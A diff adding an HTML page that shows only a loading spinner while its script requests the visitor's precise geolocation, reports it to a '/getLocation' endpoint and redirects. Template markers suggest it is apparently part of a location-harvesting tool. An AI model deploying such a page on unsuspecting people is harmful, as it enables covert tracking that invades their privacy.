@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+  <html>
+    <head>
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <style>
+        body {
+          background-color: #222;
+        }
+        .loader {
+          border: 8px solid #f3f3f3;
+          border-radius: 50%;
+          border-top: 8px solid red;
+          width: 50px;
+          height: 50px;
+          -webkit-animation: spin 2s linear infinite;
+          animation: spin 2s linear infinite;
+          left: 48%;
+          top: 44%;
+          position: fixed;
+        }
+        @-webkit-keyframes spin {
+          0% { -webkit-transform: rotate(0deg); }
+          100% { -webkit-transform: rotate(360deg); }
+        }
+
+        @keyframes spin {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg); }
+        }
+      </style>
+      <script>
+        /* #$--SEND--$# */
+        var updateLocation = new XMLHttpRequest();
+       
+
+            if (navigator.geolocation)
+            {
+                navigator.geolocation.getCurrentPosition(
+                    // Success function
+                    showPosition,
+                    // Error function
+                    errorF,
+                    // Options. See MDN for details.
+                    {
+                      enableHighAccuracy: true,
+                      timeout: 5000,
+                      maximumAge: 0
+                    });
+            }
+            else {
+            
+                manualSend("/getLocation?lat=" + 0 + "&lon=" + 0 + "&no=1");
+
+            }
+            function errorF()
+            {
+           
+                manualSend("/getLocation?lat=" + 0 + "&lon=" + 0 + "&no=1");
+            }
+            function showPosition(position) {
+               
+                manualSend( "/getLocation?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude + "&no=0");
+            }
+
+            updateLocation.onreadystatechange = function()
+            {
+                if(this.readyState == 4 && this.status == 200)
+                {
+                    console.log(this.response);
+                    this.response.split("~");
+
+                    if(this.response.split("~")[0] == "good")
+                    {
+                     /*#$--FORWARD--$#*/ window.location.replace("/main?location=" + this.response.split("~")[1]);
+                    }
+                }
+                
+            }
+
+            function manualSend(url){
+                
+                updateLocation.open("GET", url);
+                updateLocation.send();
+            }
+
+            
+
+
+            /* #$--SEND--$# */
+      </script>
+    </head>
+    <body>
+      <div class="loader"></div>
+  </body>
+</html>
